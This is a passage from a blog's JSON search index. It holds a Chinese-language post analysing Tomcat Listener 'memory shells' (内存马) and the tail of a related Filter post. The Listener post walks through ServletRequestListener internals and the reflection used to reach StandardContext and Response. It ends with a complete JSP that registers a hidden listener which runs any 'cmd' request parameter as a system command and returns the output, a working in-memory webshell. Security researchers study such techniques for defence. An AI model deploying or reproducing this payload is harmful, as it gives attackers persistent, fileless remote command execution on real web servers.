filterChain\n","permalink":"https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-filter%E5%86%85%E5%AD%98%E9%A9%AC/","summary":"hhh，Listener内存马分析完后，自己尝试构造了Filter poc，最后没借助分析文章构造出来挺兴奋的hh 环境 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;9.0.96\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 先贴poc吧，","title":"Tomcat Filter内存马"},{"content":"环境搭建 配置好tomcat后，调试时笔者用的maven，然后下载对应源码就好了\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;9.0.96\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 0x01 Listener前置知识 Java Web 开发中的监听器（Listener）就是 Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。\n用途 可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。\nListener 三个域对象 ServletContextListener HttpSessionListener ServletRequestListener 很明显，ServletRequestListener 是最适合用来作为内存马的。因为 ServletRequestListener 是用来监听 ServletRequest对 象的，当我们访问任意资源时，都会触发ServletRequestListener#requestInitialized()方法。\n0x02 Listener流程分析 Servlet 规范中一共定义了 8 个 Listener 接口\nhttp://c.biancheng.net/servlet2/listener.html\n但因为内存马本身的特殊性, 一般选用 ServletRequestListener 接口\npackage com.example.learnservlet; import javax.servlet.*; import javax.servlet.annotation.*; @WebListener public class TestListener implements ServletRequestListener{ public TestListener() { } @Override public void requestDestroyed(ServletRequestEvent sre) { } @Override public void requestInitialized(ServletRequestEvent sre) { System.out.println(\u0026#34;test listener\u0026#34;); } } requestInitialized处断点，通过调用栈往会看，可以看到这里调用转化为ServletRequestListener的requestInitialized\n往前看，通过getApplicationEventListeners获取所有listener\n这里可以看到applicationEventListenersList存放着listener\nStandardContext#addApplicationEventListener可以添加listener\n其实这里思路就出来，通过jsp执行java代码找到StandardContext类调用addApplicationEventListener注入我们的恶意listener。\n两个困难\n怎么获得对应的StandardContext 这里我不太懂为什么可以这样得到\nServletContext servletContext = request.getServletContext(); or ServletContext servletContext = request.getSession().getServletContext(); requestInitialized()方法得到的参数只有ServletRequestEvent，没有类似Response返回命令执行结果的值 当然这里没回显的话也可以不考虑，但是这里是能做到回显的（有师傅可能会说直接用jsp的Response不就行了么，想上面直接用jsp的request）\n理解: 内存马，这里是jsp执行后肯定要删掉jsp，留下来的只有这个Listener，后面调用也只会调用requestInitialized()方法里代码，所以这里回显不能依赖jsp，只能靠传入的参数ServletRequestEvent调用，前面的request是用来找到ServletContext的写入Listener只需要调用一次，所以可以直接用jsp的request\nResponse和Request获取 下面我们来看怎么构造回显\n从下图我们可以得到ServletRequestEvent.request实例是RequestFacade，而RequestFacade.request是Request，Request含有Response类的属性\nServletRequestEvent.request -\u0026gt; RequestFacade.request -\u0026gt; Request.Response 这里我们通过反射可以得到Response\nServletRequest servletRequest = sre.getServletRequest(); Field request1 = servletRequest.getClass().getDeclaredField(\u0026#34;request\u0026#34;); request1.setAccessible(true); Request o = (Request)request1.get(servletRequest); Field request2 = o.getClass().getDeclaredField(\u0026#34;response\u0026#34;); Response response = (Response) request2.get(o); 下面就是获取StandardContext ServletContext servletContext = request.getServletContext(); or ServletContext servletContext = request.getSession().getServletContext(); 上面获取的实例是ApplicationContextFacade\n环境初始化的时候会对StandardContext进行封装，所以我们可以通过ApplicationContextFacade反射得到StandardContext实例\nStandardContext.java#postWorkDirectory() StandardContext.java#getServletContext() StandardContext.java#context = new ApplicationContext(this); ApplicationContext#facade = new ApplicationContextFacade(this); ApplicationContextFacade#ApplicationContextFacade.context = (ApplicationContext)context ApplicationContext(StandardContext context){this.context = (StandardContext)context;} 0x03构造内存马 \u0026lt;%@ page import=\u0026#34;java.lang.reflect.Field\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;javax.security.auth.message.callback.SecretKeyCallback\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.Request\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.PrintWriter\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.connector.Response\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContextFacade\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.ApplicationContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;org.apache.catalina.core.StandardContext\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStream\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.BufferedReader\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.InputStreamReader\u0026#34; %\u0026gt; \u0026lt;% //反射得到StandardContext ApplicationContextFacade servletContext = (ApplicationContextFacade) request.getServletContext(); Field con = servletContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); con.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) con.get(servletContext); Field context = applicationContext.getClass().getDeclaredField(\u0026#34;context\u0026#34;); context.setAccessible(true); StandardContext Standardcontext1 = (StandardContext) context.get(applicationContext); ServletRequestListener servletRequestListener = new ServletRequestListener() { void requestDestroyed() { } public void requestInitialized(ServletRequestEvent sre) { try { //反射得到Response ServletRequest servletRequest = sre.getServletRequest(); Field request1 = servletRequest.getClass().getDeclaredField(\u0026#34;request\u0026#34;); request1.setAccessible(true); Request o = (Request)request1.get(servletRequest); Field request2 = o.getClass().getDeclaredField(\u0026#34;response\u0026#34;); request2.setAccessible(true); Response response = (Response) request2.get(o); String cmd = o.getParameter(\u0026#34;cmd\u0026#34;); Process exec = Runtime.getRuntime().exec(cmd); InputStream inputStream = exec.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); // 设置响应头，确保客户端能正确接收文本数据 response.setContentType(\u0026#34;text/plain\u0026#34;); response.setCharacterEncoding(\u0026#34;UTF-8\u0026#34;); // 获取输出流，用于向客户端发送数据 PrintWriter writer = response.getWriter(); String line; while ((line = reader.readLine())!= null) { writer.write(line + \u0026#34;\\n\u0026#34;); } // 关闭相关资源 reader.close(); inputStream.close(); writer.close(); } catch (Exception e) { throw new RuntimeException(e); } } }; //插入Listener Standardcontext1.addApplicationEventListener(servletRequestListener); out.println(\u0026#34;oooooooooooooooh yeah\u0026#34;); %\u0026gt; 参考链接 https://w0s1np.github.io/blog/tomcat_listener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html/#0x04-%E7%BC%96%E5%86%99%E5%86%85%E5%AD%98%E9%A9%AC\nhttps://exp10it.io/2022/11/tomcat-listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/#%E8%8E%B7%E5%8F%96-request-%E5%92%8C-response\nTomcat 架构与Context分析\n","permalink":"https://Jiecub3.github.io/zh/posts/java/%E5%86%85%E5%AD%98%E9%A9%AC/tomcat-listener%E5%86%85%E5%AD%98%E9%A9%AC/","summary":"环境搭建 配置好tomcat后，调试时笔者用的maven，然后下载对应源码就好了 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;9.0.96\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 0x01 Listener前置知识 Java Web 开发中的监听器（Lis","title":"Tomcat Listener内存马"}]